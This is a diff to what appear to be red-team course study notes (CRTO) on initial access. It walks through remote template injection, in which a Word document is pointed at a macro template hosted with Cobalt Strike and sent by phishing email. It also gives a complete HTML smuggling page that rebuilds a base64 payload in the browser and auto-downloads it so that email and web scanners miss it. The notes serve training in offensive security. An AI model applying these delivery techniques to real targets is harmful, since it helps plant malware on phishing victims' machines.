@@ -317,11 +317,86 @@ ubuntu@DESKTOP-3BSK7NO ~> python3 remoteinjector.py -w http://nickelviper.com/te
 URL Injected and saved to /mnt/c/Payloads/document_new.docx
 ```
 - Manual
-1. Open Word on the Attacker Desktop, create a new blank document and insert your desired macro.  Save this to C:\Payloads as a Word 97-2003 Template (*.dot) file.  This is now our "malicious remote template".  Use Cobalt Strike to host this file at http://nickelviper.com/template.dot.
+
+1. Open Word on the Attacker Desktop, create a new blank document, and insert your desired macro.  Save this to C:\Payloads as a Word 97-2003 Template (*.dot) file. This is now our "malicious remote template".  Use Cobalt Strike (`Site Management` > `Host File`) to host this file at http://nickelviper.com/template.dot.
+
+![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/e85268ec-0e37-4f37-9c04-da1bec795dd9)
+
+this will give us the URL of template file
+
+![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/986f4457-6426-4051-aa2e-3be9c6adfb41)
 
 2. create a new document from the blank template located in `C:\Users\Attacker\Documents\Custom Office Templates`.  Add any content you want, then save it to `C:\Payloads` as a new .docx.  Browse to the directory in explorer, right-click and select `7-Zip` > `Open archive`.  Navigate to `word` > `_rels`, right-click on `settings.xml.rels` and select Edit.
 
 This is just a small XML file.  Scroll right until you see the Target entry.
 
 It's currently pointing to the template on our local disk from which the document was created.  Simply modify this so it points to the template URL instead.
+
+![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/aba295a5-4c0d-41c6-820f-8cc9b7b55b89)
+
+3. send the phishing email and attach your `WordDocument.docx`
+
+4. before you open the word document. head to `View` > `Web Log` to check if you were able to hit the web server
+
+![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/7190462a-39c7-46c9-9dac-9778a5a9a976)
+
+![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/9533837a-32df-4cc4-a84d-6ac9db9bb4a8)
+
+if you can see that template.dot has requested and downloaded by the `WordDocument.docx`
+
+### HTML Smuggling
+- Email and web scanners are capable of parsing these out and taking some action.  They may be removed entirely, or the URL content fetched and scanned by an AV sandbox.  HTML smuggling allows us to get around this by embedding the payload into the HTML source code and using JavaScript to construct URLs by the browser at runtime.
+
+```
+<html>
+    <head>
+        <title>HTML Smuggling</title>
+    </head>
+    <body>
+        <p>This is all the user will see...</p>
+
+        <script>
+        function convertFromBase64(base64) {
+            var binary_string = window.atob(base64);
+            var len = binary_string.length;
+            var bytes = new Uint8Array( len );
+            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
+            return bytes.buffer;
+        }
+
+        var file ='VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
+        var data = convertFromBase64(file);
+        var blob = new Blob([data], {type: 'octet/stream'});
+        var fileName = 'test.txt';
+
+        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
+        else {
+            var a = document.createElement('a');
+            document.body.appendChild(a);
+            a.style = 'display: none';
+            var url = window.URL.createObjectURL(blob);
+            a.href = url;
+            a.download = fileName;
+            a.click();
+            window.URL.revokeObjectURL(url);
+        }
+        </script>
+    </body>
+</html>
+```
+As this goes over the wire, a scanner will only see HTML and JavaScript.  There are no hardcoded hyperlinks and the content type of the page itself is just `text/html`.
+
+The encoded content in the `file` variable was created with:
+```
+ubuntu@DESKTOP-3BSK7NO ~> echo -en "This is a smuggled file" | base64
+```
+
+When you visit this page, the browser will automatically reconstruct and download the file without any interaction from the user.
+
+![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/94a5392c-5ae4-4d4d-89c1-6491eb66a614)
+
+The Python HTTP server is a nice quick way to spin up a web server for testing.
+```
+python3 -m http.server 8080
+```
 
